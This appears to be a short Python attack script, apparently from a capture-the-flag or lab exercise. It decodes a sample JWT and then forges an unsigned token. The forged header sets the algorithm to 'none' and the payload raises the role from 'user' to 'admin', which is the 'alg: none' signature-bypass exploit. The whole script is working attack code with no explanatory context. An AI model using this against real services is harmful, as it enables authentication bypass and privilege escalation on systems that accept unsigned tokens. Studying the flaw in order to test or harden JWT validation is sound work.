import werkzeug
import base64
import hashlib
import json

token= "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.Ne5rbW9NwVQGK_YEjFdQWZKN1jjD5kL5HjfvFR2Ickc"


parts = token.split('.')

header = parts[0]
payload = parts[1]
signature = parts[2]



def decode(part):
    return json.loads(base64.urlsafe_b64decode(part))

print("HEADER:", decode(header))
print("PAYLOAD:", decode(payload))
print("SIGNATURE:", signature)


def encode(data):
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "username": "guest",
    "role": "admin"
}

forged_token = encode(header) + "." + encode(payload) + "."

print(forged_token)